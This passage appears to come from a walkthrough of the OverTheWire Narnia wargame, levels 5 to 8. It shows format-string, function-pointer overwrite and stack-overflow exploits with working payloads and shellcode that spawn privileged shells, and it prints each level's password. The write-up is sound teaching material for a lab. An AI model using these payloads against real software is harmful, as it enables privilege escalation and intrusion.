\xe3\x89\xd1\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\xd0\xff\xff")
    $ id
    uid=14005(narnia5) gid=14004(narnia4) groups=14004(narnia4)
    $ whoami
    narnia5
    $ cat /etc/narnia_pass/narnia5
    Ni3xHPEuuw

one can easily navigate to the file where the password for the next level is located 
and continue breaking things apart!

Password: **Ni3xHPEuuw**


## narnia5

After connecting to the specific level with `ssh` by typing
    *ssh narnia5@narnia.labs.overthewire.org -p 2226* 
with password 
    *Ni3xHPEuuw*

one can find the source code for `narnia5` binary under /narnia, which is the following:

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    int main(int argc, char **argv){
            int i = 1;
            char buffer[64];

            snprintf(buffer, sizeof buffer, argv[1]);
            buffer[sizeof (buffer) - 1] = 0;
            printf("Change i's value from 1 -> 500. ");

            if(i==500){
                    printf("GOOD\n");
            setreuid(geteuid(),geteuid());
                    system("/bin/sh");
            }

            printf("No way...let me give you a hint!\n");
            printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
            printf ("i = %d (%p)\n", i, &i);
            return 0;
    }

In the above code, there is no buffer overflow as the call the `snprintf` writes data 
from `argv[1]` to `buffer` of a specific length, which is `strlen(buffer)-1`, securing 
the unavailability to overflowing and crashing the program. What is interesting though, 
is the fact that `argv[1]` is writen DIRECTLY to the `buffer`, causing a format string
vulnerability. After investigating, one can see the following: 

    narnia5@gibson:~$ /narnia/narnia5 AAAA-%x-%x-%x-%x
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [AAAA-41414141-3431342d-34313431-34332d31] (40)
    i = 1 (0xffffd2b0)

The first `%x` identifier that is being putted inside the attacker's format string is 
leaks the value of `A`s being placed also by the attacker inside the stack (`buffer` is 
in the stack). Also the program helps us a bit, by leaking the address of `i` variable
that we need to change in this case. So, by studying a bit about format strings and how
`printf` and its family behaves, one can figure out that by using `%n` it is possible 
to write *the number of bytes written so far* directly in memory. This can be actually 
tested by using the PoC shown below:

    narnia5@gibson:~$ /narnia/narnia5 $(echo -ne "\xb0\xd2\xff\xff")%100x%1\$n
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [����                                                           ] (63)
    i = 104 (0xffffd2b0)

Here, the address of `i` is being pushed onto the stack, a hexadecimal value with length
of 100 is also placed in the format string, which means that 104 bytes are written so far, 
and the `%1\$n` writes the number of characters printed so far (100) to the memory location 
pointed to by the first argument.

**Note**: `\` is used inside `%1\$n` in order for `$` to be escaped.

So, one can just change 100 to 496 and make `i` equal to 500, as shown below: 

    narnia5@gibson:~$ /narnia/narnia5 $(echo -ne "\xb0\xd2\xff\xff")%496x%1\$n
    Change i's value from 1 -> 500. GOOD
    $ id 
    uid=14006(narnia6) gid=14005(narnia5) groups=14005(narnia5)
    $ cat /etc/narnia_pass/narnia6 
    BNSjoSDeGL

Password: **BNSjoSDeGL**


## narnia6

After connecting to the specific level with `ssh` by typing
    *ssh narnia6@narnia.labs.overthewire.org -p 2226* 
with password 
    *BNSjoSDeGL*

one can find the vulnerable `narnia6` code in the following snippet: 

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    extern char **environ;

    // tired of fixing values...
    // - morla
    unsigned long get_sp(void) {
        __asm__("movl %esp,%eax\n\t"
                "and $0xff000000, %eax"
                );
    }

    int main(int argc, char *argv[]){
            char b1[8], b2[8];
            int  (*fp)(char *)=(int(*)(char *))&puts, i;

            if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

            /* clear environ */
            for(i=0; environ[i] != NULL; i++)
                    memset(environ[i], '\0', strlen(environ[i]));
            /* clear argz    */
            for(i=3; argv[i] != NULL; i++)
                    memset(argv[i], '\0', strlen(argv[i]));

            strcpy(b1,argv[1]);
            strcpy(b2,argv[2]);
            //if(((unsigned long)fp & 0xff000000) == 0xff000000)
            if(((unsigned long)fp & 0xff000000) == get_sp())
                    exit(-1);
            setreuid(geteuid(),geteuid());
        fp(b1);

            exit(1);
    }

The line `int (*fp)(char *) = (int(*)(char *))&puts, i;` declares a function pointer 
`fp` that points to a function with the same signature as `puts` and initializes `fp` 
to point to `puts`. It also declares an integer variable i. This allows the function 
`puts` to be called via the function pointer `fp`.
So, when we see `fp(b1)` is like seeing `puts(b1)`.
But this will be executed ONLY IF the condition `if(((unsigned long)fp & 0xff000000) == get_sp())`
is equal to false. 

This means that: 
* Because `get_sp()` (a function that movs `$esp` to `$eax` register, `AND`s the first 
byte and returns it)  will return `0xff`.
* Because `(unsigned long)fp & 0xff000000` expression will return only the first byte 
of `fp` pointer.
* In order to reach the desired code, the first byte of `fp` need to be NOT equal to `0xff`.

The vulnerable use of `strcpy`s inside the code can be used for overwriting the `fp` pointer
and make it point to something we desire (e.g. some call to system()).

After debugging a bit with gdb and setting a breakpoint right before the `fp(b1)` call, one 
can see from the snippet below, 

    Dump of assembler code for function main:
    0x080491e3 <+0>:	push   ebp
    0x080491e4 <+1>:	mov    ebp,esp
    0x080491e6 <+3>:	push   ebx
    0x080491e7 <+4>:	sub    esp,0x18
    0x080491ea <+7>:	mov    DWORD PTR [ebp-0xc],0x8049070
    0x080491f1 <+14>:	cmp    DWORD PTR [ebp+0x8],0x3
    0x080491f5 <+18>:	je     0x8049211 <main+46>
    0x080491f7 <+20>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080491fa <+23>:	mov    eax,DWORD PTR [eax]
    0x080491fc <+25>:	push   eax
    0x080491fd <+26>:	push   0x804a008
    0x08049202 <+31>:	call   0x8049040 <printf@plt>
    0x08049207 <+36>:	add    esp,0x8
    0x0804920a <+39>:	push   0xffffffff
    0x0804920c <+41>:	call   0x8049080 <exit@plt>
    0x08049211 <+46>:	mov    DWORD PTR [ebp-0x8],0x0
    0x08049218 <+53>:	jmp    0x8049252 <main+111>
    0x0804921a <+55>:	mov    eax,ds:0x804b230
    0x0804921f <+60>:	mov    edx,DWORD PTR [ebp-0x8]
    0x08049222 <+63>:	shl    edx,0x2
    0x08049225 <+66>:	add    eax,edx
    0x08049227 <+68>:	mov    eax,DWORD PTR [eax]
    0x08049229 <+70>:	push   eax
    0x0804922a <+71>:	call   0x80490a0 <strlen@plt>
    0x0804922f <+76>:	add    esp,0x4
    0x08049232 <+79>:	mov    edx,DWORD PTR ds:0x804b230
    0x08049238 <+85>:	mov    ecx,DWORD PTR [ebp-0x8]
    0x0804923b <+88>:	shl    ecx,0x2
    0x0804923e <+91>:	add    edx,ecx
    0x08049240 <+93>:	mov    edx,DWORD PTR [edx]
    0x08049242 <+95>:	push   eax
    0x08049243 <+96>:	push   0x0
    0x08049245 <+98>:	push   edx
    0x08049246 <+99>:	call   0x80490b0 <memset@plt>
    0x0804924b <+104>:	add    esp,0xc
    0x0804924e <+107>:	add    DWORD PTR [ebp-0x8],0x1
    0x08049252 <+111>:	mov    eax,ds:0x804b230
    0x08049257 <+116>:	mov    edx,DWORD PTR [ebp-0x8]
    0x0804925a <+119>:	shl    edx,0x2
    0x0804925d <+122>:	add    eax,edx
    0x0804925f <+124>:	mov    eax,DWORD PTR [eax]
    0x08049261 <+126>:	test   eax,eax
    0x08049263 <+128>:	jne    0x804921a <main+55>
    0x08049265 <+130>:	mov    DWORD PTR [ebp-0x8],0x3
    0x0804926c <+137>:	jmp    0x80492a9 <main+198>
    0x0804926e <+139>:	mov    eax,DWORD PTR [ebp-0x8]
    0x08049271 <+142>:	lea    edx,[eax*4+0x0]
    0x08049278 <+149>:	mov    eax,DWORD PTR [ebp+0xc]
    0x0804927b <+152>:	add    eax,edx
    0x0804927d <+154>:	mov    eax,DWORD PTR [eax]
    0x0804927f <+156>:	push   eax
    0x08049280 <+157>:	call   0x80490a0 <strlen@plt>
    0x08049285 <+162>:	add    esp,0x4
    0x08049288 <+165>:	mov    edx,DWORD PTR [ebp-0x8]
    0x0804928b <+168>:	lea    ecx,[edx*4+0x0]
    0x08049292 <+175>:	mov    edx,DWORD PTR [ebp+0xc]
    0x08049295 <+178>:	add    edx,ecx
    0x08049297 <+180>:	mov    edx,DWORD PTR [edx]
    0x08049299 <+182>:	push   eax
    0x0804929a <+183>:	push   0x0
    0x0804929c <+185>:	push   edx
    0x0804929d <+186>:	call   0x80490b0 <memset@plt>
    0x080492a2 <+191>:	add    esp,0xc
    0x080492a5 <+194>:	add    DWORD PTR [ebp-0x8],0x1
    0x080492a9 <+198>:	mov    eax,DWORD PTR [ebp-0x8]
    0x080492ac <+201>:	lea    edx,[eax*4+0x0]
    0x080492b3 <+208>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080492b6 <+211>:	add    eax,edx
    0x080492b8 <+213>:	mov    eax,DWORD PTR [eax]
    0x080492ba <+215>:	test   eax,eax
    0x080492bc <+217>:	jne    0x804926e <main+139>
    0x080492be <+219>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080492c1 <+222>:	add    eax,0x4
    0x080492c4 <+225>:	mov    eax,DWORD PTR [eax]
    0x080492c6 <+227>:	push   eax
    0x080492c7 <+228>:	lea    eax,[ebp-0x14]
    0x080492ca <+231>:	push   eax
    0x080492cb <+232>:	call   0x8049060 <strcpy@plt>
    0x080492d0 <+237>:	add    esp,0x8
    0x080492d3 <+240>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080492d6 <+243>:	add    eax,0x8
    0x080492d9 <+246>:	mov    eax,DWORD PTR [eax]
    0x080492db <+248>:	push   eax
    0x080492dc <+249>:	lea    eax,[ebp-0x1c]
    0x080492df <+252>:	push   eax
    0x080492e0 <+253>:	call   0x8049060 <strcpy@plt>
    0x080492e5 <+258>:	add    esp,0x8
    0x080492e8 <+261>:	mov    eax,DWORD PTR [ebp-0xc]
    0x080492eb <+264>:	and    eax,0xff000000
    0x080492f0 <+269>:	mov    ebx,eax
    0x080492f2 <+271>:	call   0x80491d6 <get_sp>
    0x080492f7 <+276>:	cmp    ebx,eax
    0x080492f9 <+278>:	jne    0x8049302 <main+287>
    0x080492fb <+280>:	push   0xffffffff
    0x080492fd <+282>:	call   0x8049080 <exit@plt>
    0x08049302 <+287>:	call   0x8049050 <geteuid@plt>
    0x08049307 <+292>:	mov    ebx,eax
    0x08049309 <+294>:	call   0x8049050 <geteuid@plt>
    0x0804930e <+299>:	push   ebx
    0x0804930f <+300>:	push   eax
    0x08049310 <+301>:	call   0x8049090 <setreuid@plt>
    0x08049315 <+306>:	add    esp,0x8
    0x08049318 <+309>:	lea    eax,[ebp-0x14]
    0x0804931b <+312>:	push   eax
    0x0804931c <+313>:	mov    eax,DWORD PTR [ebp-0xc]
 => 0x0804931f <+316>:	call   eax
    0x08049321 <+318>:	add    esp,0x4
    0x08049324 <+321>:	push   0x1
    0x08049326 <+323>:	call   0x8049080 <exit@plt>
    End of assembler dump.
    (gdb) x $ebp-0xc 
    0xffffd28c:	0x08049000
    (gdb) x/16wx $esp
    0xffffd278:	0xffffd284	0x42424242	0x42424242	0x41414100
    0xffffd288:	0x41414141	0x08049000	0x00000003	0xf7fade34
    0xffffd298:	0x00000000	0xf7da1cb9	0x00000003	0xffffd354
    0xffffd2a8:	0xffffd364	0xffffd2c0	0xf7fade34	0x080490ed

that after running yhe program with argv[1] equal to `AAAAAAAA` and argv[2] equal to
`BBBBBBBB`, the `fp` pointer is located right after the `b1` character array, which means
by overflowing `b1`, we can control the value of `fp`. A simple PoC of doing that is 
by running the program once again like this: 

    (gdb) r AAAAAAAACCCC BBBBBBBB 
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /narnia/narnia6 AAAAAAAACCCC BBBBBBBB
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x0804931f in main ()
    (gdb) x/16wx $esp
    0xffffd278:	0xffffd284	0x42424242	0x42424242	0x41414100
    0xffffd288:	0x41414141	0x43434343	0x00000000	0xf7fade34
    0xffffd298:	0x00000000	0xf7da1cb9	0x00000003	0xffffd354
    0xffffd2a8:	0xffffd364	0xffffd2c0	0xf7fade34	0x080490ed
    (gdb) c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
    0x43434343 in ?? ()

As we can see the program tried to call the 0x43434343 which is an attacker controlled 
value. So by considering the fact that ASLR is disabled, we can find the address of 
`system()` which is loaded every time the program is spawned in the same memory address
and use it by first pushing in the stack the string "/bin/sh" in order to drop a shell
when `system()` is executed. A simple way for accomplishing this is shown below.

    (gdb) r AAAAAAAACCCC BBBBBBBBDDDD (1)
    Starting program: /narnia/narnia6 AAAAAAAACCCC BBBBBBBBDDDD
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x0804931f in main ()
    (gdb) p system 
    $1 = {int (const char *)} 0xf7dcd430 <__libc_system>
    (gdb) x/16wx $esp 
    0xffffd268:	0xffffd274	0x42424242	0x42424242	0x44444444 (2)
    0xffffd278:	0x41414100	0x43434343	0x00000000	0xf7fade34
    0xffffd288:	0x00000000	0xf7da1cb9	0x00000003	0xffffd344
    0xffffd298:	0xffffd354	0xffffd2b0	0xf7fade34	0x080490ed
    (gdb) r AAAAAAAA$(echo -ne "\x30\xd4\xdc\xf7") BBBBBBBBDDDD
    quit
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /narnia/narnia6 AAAAAAAA$(echo -ne "\x30\xd4\xdc\xf7") BBBBBBBBDDDD
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x0804931f in main ()

    (gdb) x/16wx $esp 

    0xffffd268:	0xffffd274	0x42424242	0x42424242	0x44444444
    0xffffd278:	0x41414100	0xf7dcd430	0x00000000	0xf7fade34
    0xffffd288:	0x00000000	0xf7da1cb9	0x00000003	0xffffd344
    0xffffd298:	0xffffd354	0xffffd2b0	0xf7fade34	0x080490ed

At (1),(2) we can see that the first 4 bytes of `argv[1]` have been overwritten with the last 4
bytes of `argv[2]`, which urges the attacker after finding the `system()`'s address and putting it 
to the correct place, to overflow `b2` with "/bin/sh" which has length of 7 and 
and will overwrite all `A`s produced by `argv[1]`. Meaning one can run the binary with the arguments
below, spawn a shell with the privileges of `narnia7` and grab the password for the next level.

    narnia6@gibson:~$ /narnia/narnia6 AAAAAAAA$(echo -ne "\x30\xd4\xdc\xf7") BBBBBBBB/bin/sh
    $ id
    uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)
    $ cat /etc/narnia_pass/narnia7
    54RtepCEU0

Password: **54RtepCEU0**


## narnia7

After connecting to the specific level with `ssh` by typing
    *ssh narnia7@narnia.labs.overthewire.org -p 2226* 
with password 
    *54RtepCEU0*

one can find the vulnerable code of `narnia7` binary in the following snippet:

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>

    int goodfunction();
    int hackedfunction();

    int vuln(const char *format){
            char buffer[128];
            int (*ptrf)();

            memset(buffer, 0, sizeof(buffer));
            printf("goodfunction() = %p\n", goodfunction);
            printf("hackedfunction() = %p\n\n", hackedfunction);

            ptrf = goodfunction;
            printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

            printf("I guess you want to come to the hackedfunction...\n");
            sleep(2);
            ptrf = goodfunction;

            snprintf(buffer, sizeof buffer, format);

            return ptrf();
    }

    int main(int argc, char **argv){
            if (argc <= 1){
                    fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                    exit(-1);
            }
            exit(vuln(argv[1]));
    }

    int goodfunction(){
            printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
            fflush(stdout);

            return 0;
    }

    int hackedfunction(){
            printf("Way to go!!!!");
                fflush(stdout);
            setreuid(geteuid(),geteuid());
            system("/bin/sh");

            return 0;
    }

The above program has the below characteristics: 

* `ptrf()` function pointer which is used to call either `goodfunction()` or `hackedfunction()`.
* `goodfunction()`'s address is assigned to our function pointer.
* `hackedfunction()` is our target (spawns a shell).
* `vuln(char *format)` returns a integer which is passed inside `exit()` in main.
The `vuln()` function has a format string vulnerability which urges the attacker 
to changing the address of where the `ptrf` function pointer is pointing to (initially
pointing to `goodfunction()`) to `hackedfunction()`'s address.

**Note**: ASLR is disabled and the program hints us with the addresses of those afformentioned functions.

So, without even the need to fire up gdb one can craft an exploit PoC just by looking at 
the hints (addresses) the program flushes to stdout. Thus, by placing the address of the 
`ptrf` function pointer in the start of our attacker controlled format string, one can 
quickly figure out what should need to do. 

    narnia7@gibson:~$ /narnia/narnia7 AAAA
    goodfunction() = 0x80492ea
    hackedfunction() = 0x804930f

    before : ptrf() = 0x80492ea (0xffffd238)
    I guess you want to come to the hackedfunction...
    Welcome to the goodfunction, but i said the Hackedfunction..

The attacker need to place "0xffffd238" in the stack and then try to right in this address.
What does he/she have to write? The address of `hackedfunction()` which is "0x0804930f". So, 
by placing the `ptrf`'s stack address onto the stack, we already have written 4 bytes. By 
converting "0x0804930f" to an integer which is "134517519", we can create the value we need 
to place inside the `ptrf`'s memory address with the command below: 

    $(echo -ne "\x38\xd2\xff\xff")%134517515x%n 
    
**Note**: We have to substract 4 from 134517519 because we have already written 4 bytes when
placing the `ptrf`'s onto the stack.

Finally, by running `narnia7` with the above command as an argument, one can spawn a shell,
elevate privileges and grab the password for the next and final level.

    narnia7@gibson:~$ /narnia/narnia7 $(echo -ne "\x38\xd2\xff\xff")%134517515x%n 
    goodfunction() = 0x80492ea
    hackedfunction() = 0x804930f

    before : ptrf() = 0x80492ea (0xffffd238)
    I guess you want to come to the hackedfunction...
    Way to go!!!!$ whoami 
    narnia8
    $ cat /etc/narnia_pass/narnia8 
    i1SQ81fkb8

Password: **i1SQ81fkb8**


## narnia8

After connecting to the specific level with `ssh` by typing
    *ssh narnia8@narnia.labs.overthewire.org -p 2226* 
with password 
    *i1SQ81fkb8*

one can find the current's level vulnerable code in the following snippet.

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    int i;

    void func(char *b){
        char *blah=b;
        char bok[20];

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
            bok[i]=blah[i];

        printf("%s\n",bok);
    }

    int main(int argc, char **argv){

        if(argc > 1)
            func(argv[1]);
        else
            printf("%s argument\n", argv[0]);

        return 0;
    }
                                        
After some examining with gdb and disassembling the `func()` function, one can see
that if we specify 20 bytes without overflowing the `bok` variable everything seems 
to be working as it should. 

    Dump of assembler code for function func:
    0x08049176 <+0>:	push   ebp
    0x08049177 <+1>:	mov    ebp,esp
    0x08049179 <+3>:	sub    esp,0x18
    0x0804917c <+6>:	mov    eax,DWORD PTR [ebp+0x8] [1]
    0x0804917f <+9>:	mov    DWORD PTR [ebp-0x4],eax [2]
    0x08049182 <+12>:	push   0x14
    0x08049184 <+14>:	push   0x0
    0x08049186 <+16>:	lea    eax,[ebp-0x18]
    0x08049189 <+19>:	push   eax
    0x0804918a <+20>:	call   0x8049050 <memset@plt>
    0x0804918f <+25>:	add    esp,0xc
    0x08049192 <+28>:	mov    DWORD PTR ds:0x804b228,0x0
    0x0804919c <+38>:	jmp    0x80491c3 <func+77>
    0x0804919e <+40>:	mov    eax,ds:0x804b228
    0x080491a3 <+45>:	mov    edx,eax
    0x080491a5 <+47>:	mov    eax,DWORD PTR [ebp-0x4]
    0x080491a8 <+50>:	add    edx,eax
    0x080491aa <+52>:	mov    eax,ds:0x804b228
    0x080491af <+57>:	movzx  edx,BYTE PTR [edx]
    0x080491b2 <+60>:	mov    BYTE PTR [ebp+eax*1-0x18],dl
    0x080491b6 <+64>:	mov    eax,ds:0x804b228
    0x080491bb <+69>:	add    eax,0x1
    0x080491be <+72>:	mov    ds:0x804b228,eax
    0x080491c3 <+77>:	mov    eax,ds:0x804b228
    0x080491c8 <+82>:	mov    edx,eax
    0x080491ca <+84>:	mov    eax,DWORD PTR [ebp-0x4]
    0x080491cd <+87>:	add    eax,edx
    0x080491cf <+89>:	movzx  eax,BYTE PTR [eax]
    0x080491d2 <+92>:	test   al,al
    0x080491d4 <+94>:	jne    0x804919e <func+40>
    0x080491d6 <+96>:	lea    eax,[ebp-0x18]
    0x080491d9 <+99>:	push   eax
    0x080491da <+100>:	push   0x804a008
    0x080491df <+105>:	call   0x8049040 <printf@plt>
    0x080491e4 <+110>:	add    esp,0x8
    0x080491e7 <+113>:	nop
    0x080491e8 <+114>:	leave
    0x080491e9 <+115>:	ret
    End of assembler dump.
    (gdb) break *0x080491df 
    Breakpoint 1 at 0x80491df
    (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41")
    Starting program: /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41")
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x080491df in func ()
    (gdb) x/16wx $esp [3]
    0xffffd27c:	0x0804a008	0xffffd284	0x41414141	0x41414141
    0xffffd28c:	0x41414141	0x41414141	0x41414141 [0xffffd4f2]
    0xffffd29c:	0xffffd2a8	0x08049201 [0xffffd4f2]	0x00000000
    0xffffd2ac:	0xf7da1cb9	0x00000002	0xffffd364	0xffffd370

One interesting thing we noticed is that at [1], [2] "$ebp+8"'s value, which the 
argument to the function is being copied to "$ebp-4", with the latter being related 
to the `blah` pointer being placed on the stack and pointing to where our function 
argument points. At [3] we can confirm what the assembly instructions are showing us. 
If we attempt to overflow the buffer with something greater than 20, let's say 24, 
one can see that we didn't overwrite much (kind of ...).

    (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42")
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42")
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    AAAAAAAAAAAAAAAAAAAA����������

    Breakpoint 1, 0x080491e7 in func ()
    (gdb) x/16wx $esp 
    0xffffd274:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd284:	0x41414141	0xffff0842	0xffffd298	0x08049201
    0xffffd294:	0xffffd4ee	0x00000000	0xf7da1cb9	0x00000002
    0xffffd2a4:	0xffffd354	0xffffd360	0xffffd2c0	0xf7fade34

As we can see, junk is printed to the console after the overflow happened. This is because
the address of the `blah` pointer changed to something non valid "0xffff0842" and data from 
this memory address is being copied to our sink buffer. But if we look carefully to the 
function's argument value at "$ebp+8", which was previously equal to "0xffffd4f2", now 
it's equal to "0xffffd4ee", which came from the fact that we added instead of 20 bytes, 24.
The difference is 4, so:

    >>> hex(0xffffd4f2-4)
    '0xffffd4ee'

This means that every time we add something the `b` pointer moves forward. So, when 
overflowing the `bok` buffer we got to make sure that the `blah` pointer has the value 
it should have, instead of pointing to junk. Thus, we can overflow the buffer with the 
following, as we can see in gdb: 

    (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xee\xd4\xff\xff")
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xee\xd4\xff\xff")
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    AAAAAAAAAAAAAAAAAAAA������������

    Breakpoint 1, 0x080491e7 in func ()
    (gdb) x/16wx $esp
    0xffffd274:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd284:	0x41414141 [0xffffd4ee]	0xffffd298	0x08049201
    0xffffd294:[0xffffd4ee]	0x00000000	0xf7da1cb9	0x00000002
    0xffffd2a4:	0xffffd354	0xffffd360	0xffffd2c0	0xf7fade34

In the above gdb snapshot, one can see that the `blah` pointer now has the correct value
(inside brackets), which means that the rest of the payload after the address we appended 
to our `A`s, will overflow stuff inside the stack. But, there an important thing that we 
should be taken under consideration; If we decide to overflow lets say with 8 `\x42` bytes
then the address of our `blah` pointer, should be:

    address of `blah` pointer with 20 `A` (0xffffd4f2) - 4 (address of `blah`) - 8 (`\x42` bytes)

which means:

    0xffffd4f2 - 4 - 8 = 0xffffd4f2 - 12 = 0xffffd4e6

So our payload should look like: 

    $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\xd4\xff\xff\x42\x42\x42\x42\x42\x42\x42\x42")

After inspecting with gdb, one can see that the overflow is actually happening and both
the "$ebp" and "$eip" register values are overflowed with our `B`s.

    (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\xd4\xff\xff\x42\x42\x42\x42\x42\x42\x42\x42")
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\xd4\xff\xff\x42\x42\x42\x42\x42\x42\x42\x42")
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    AAAAAAAAAAAAAAAAAAAA����BBBBBBBB����

    Breakpoint 1, 0x080491e7 in func ()
    (gdb) x/16wx $esp
    0xffffd274:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd284:	0x41414141	0xffffd4e6	0x42424242	0x42424242
    0xffffd294:	0xffffd4e6	0x00000000	0xf7da1cb9	0x00000002
    0xffffd2a4:	0xffffd354	0xffffd360	0xffffd2c0	0xf7fade34
    (gdb) x $ebp 
    0xffffd28c:	0x42424242
    (gdb) x $ebp + 4
    0xffffd290:	0x42424242

Now, one way to exploit this is constructing a payload that look like this: 

    padding (20 bytes) + SPECIALLY_CRAFTED_ADDRESS (4 bytes) + EBP_FILLING (4 bytes) + JMP_ESP_INSTRUCTION (4 bytes) + SHELLCODE (n bytes) # (XXX)

Regarding the `SPECIALLY_CRAFTED_ADDRESS`, because of the fact that the environment
outside gdb is different from the one in its inside, we need to figure out what is the
actual address (which will not change) of the `blah` pointer after the program receives
20 bytes from `argv[1]`. One way to do this is the following: 

    narnia8@gibson:~$ /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41") | xxd 
    00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
    00000010: 4141 4141 12d4 ffff b8d1 ffff 0192 0408  AAAA............
    00000020: 12d4 ffff 0a                             .....

As we can see the value of `blah` is "0xffffd412". The shellcode we will be using is 35 bytes long. 
And we also overflow the buffer with 12 more bytes (so 47 in total) as we can see at (XXX). So with the command
below, one can easily find what should be the actual address of `blah` after overflowing with the 
malicious payload. 

    narnia8@gibson:~$ python3 -c 'print("{:8x}".format(0xffffd412-47))'
    ffffd3e3

So our payload should look like this: 

    |----------------------------------------20------------------------------------||----4---------||---EBP---------||---jmp instr--||--------------shellcode---|
    \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe3\xd3\xff\xff\x90\x90\x90\x90\x5d\x39\xea\xf7\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80

After executing, one can spawn a shell with a privileged owner and grab the password
for the next `narnia9` level.

    narnia8@gibson:~$ /narnia/narnia8 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe3\xd3\xff\xff\x90\x90\x90\x90\x5d\x39\xea\xf7\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80") 
    AAAAAAAAAAAAAAAAAAAA��������]9��j1X1�̀�É�jFX̀�
                                                Rhn/shh//bi���̀
    $ id
    uid=14009(narnia9) gid=14008(narnia8) groups=14008(narnia8)
    $ cat /etc/narnia_pass/narnia9
    1FFD4HnU4K

Password: **1FFD4HnU4K**


CHALLENGE SOLVED!



## References

[REF_1]: http://shell-storm.org/shellcode/files/shellcode-607.html

[REF_2]: https://security.stackexchange.com/questions/184842/shellcode-does-not-execute-as-the-owner

